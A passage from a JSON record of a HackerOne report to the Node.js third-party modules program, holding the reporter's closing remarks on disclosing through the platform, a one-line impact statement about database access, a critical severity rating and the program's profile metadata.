haven&#39;t contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.</p>\n\n<p>I hope my report will help to keep Node.js ecosystem and its users safe in the future.</p>\n\n<p>Regards,</p>\n\n<p>Rafal &#39;bl4de&#39; Janicki</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>This vulnerability allows malicious user to fetch/manipulate data in database</p>\n", 
    "severity_rating": "critical", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://nodejs.org/en/security/", 
            "about": "This program is used to handle vulnerabilities in the Node.js ecosystem.", 
            "twitter_handle": "", 
            "name": "Node.js third-party modules"
        }, 
        "handle": "nodejs-ecosystem", 
        "url": "https://hackerone.com/nodejs-ecosystem", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/023/949/309112251b444244d95977d1299148aae6482789_small.?1508679627", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/023/949/c1f5f15ac094c1327c13dd19f55dbcb7411272bd_medium.?1508679627"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 23949, 
        "default_currency": "usd"
    }, 
    "is_published": false
}